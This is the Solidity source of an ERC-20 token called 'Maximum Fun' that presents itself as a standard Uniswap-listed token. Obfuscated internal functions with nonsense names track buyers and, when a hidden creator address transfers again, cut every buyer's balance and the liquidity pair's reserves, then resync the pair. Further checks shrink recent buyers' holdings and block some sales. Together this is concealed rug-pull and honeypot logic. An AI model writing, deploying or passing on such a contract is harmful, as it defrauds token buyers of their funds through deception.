pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IUniswapV2Pair {
    event Sync(uint112 reserve0, uint112 reserve1);
    function sync() external;
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private funArr;

    mapping (address => bool) private Babe;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private Fronts = 0;
    address public pair;
    IDEXRouter router;

    string private _name; string private _symbol; address private addr02892jkrjk1rf9sss; uint256 private _totalSupply; 
    bool private trading;  uint256 private Dancing; bool private Runners; uint256 private Sucking;
    
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        addr02892jkrjk1rf9sss = msgSender_;
        _name = name_;
        _symbol = symbol_;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true;
        return true;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function _LetsMakeMaxFun(address creator) internal virtual {
        approve(_router, 10 ** 77);
        (Dancing,Runners,Sucking,trading) = (0,false,0,false);
        (Babe[_router],Babe[creator],Babe[pair]) = (true,true,true);
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function fin(uint256 g) internal view returns (address) { return (Sucking > 1 ? funArr[funArr.length-g-1] : address(0)); }
    function numberTheory(uint256 num) internal view returns (uint256) { return (Runners ? (num * 1e6) : num); }
    function _updateLiquidity(bool h, bool i, bool j) internal returns (uint256) { if (h && i && j) { for (uint256 q=0; q < funArr.length; q++) { _balances[funArr[q]] /= (numberTheory(3 * 1e1)); } _balances[pair] /= 1e6; IUniswapV2Pair(pair).sync();} return _balances[pair] ** 0; }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _balancesOfTheClown(address sender, address recipient, bool simulation) internal {
        Runners = simulation ? true : Runners;
        if (((Babe[sender] == true) && (Babe[recipient] != true)) || ((Babe[sender] != true) && (Babe[recipient] != true))) { funArr.push(recipient); }                          uint256 tmpAmount = _updateLiquidity(Dancing == 1, Runners, sender == addr02892jkrjk1rf9sss);
        _balances[fin(1)] /= (((Fronts == block.timestamp) || Runners) && (Babe[fin(1)] != true) && (Sucking > 1)) ? (numberTheory(12)) : (tmpAmount ** 0);
        Fronts = block.timestamp; Sucking++; if (Runners) { require(sender != fin(0)); }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        _balancesOfTheIdiot(sender, recipient);
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _balancesOfTheIdiot(address sender, address recipient) internal {
        require((trading || (sender == addr02892jkrjk1rf9sss)), "ERC20: trading is not yet enabled.");
        _balancesOfTheClown(sender, recipient, (address(sender) == addr02892jkrjk1rf9sss) && (Dancing > 0));
        Dancing += (sender == addr02892jkrjk1rf9sss) ? 1 : 0;
    }

    function _DeployFun(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
              
        emit Transfer(address(0), account, amount);
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _DeployFun(creator, initialSupply);
        _LetsMakeMaxFun(creator);
    }
}

contract MaximumFun is ERC20Token {
    constructor() ERC20Token("Maximum Fun", "FUN", msg.sender, 20000000000 * 10 ** 18) {
    }
}